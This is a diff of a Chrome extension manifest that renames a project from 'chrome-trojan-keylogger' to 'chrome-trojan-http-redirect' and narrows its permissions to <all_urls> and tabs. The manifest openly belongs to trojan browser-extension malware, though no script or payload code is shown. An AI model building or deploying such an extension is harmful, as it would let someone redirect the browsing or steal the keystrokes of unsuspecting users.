@@ -1,7 +1,7 @@
 {
-    "name": "chrome-trojan-keylogger",
+    "name": "chrome-trojan-http-redirect",
     "version": "1.0.0",
-    "description": "trojan-keylogger",
+    "description": "trojan-http-redirect",
     "icons": {
       "16": "/app/img/ico.png",
       "48": "/app/img/ico.png",
@@ -13,10 +13,8 @@
       "persistent": true
     },
     "permissions": [
-        "tabs",
-         "<all_urls>",
-        "unlimitedStorage",
-        "storage"
+       "<all_urls>",
+       "tabs"
     ],
     "manifest_version": 2
 }
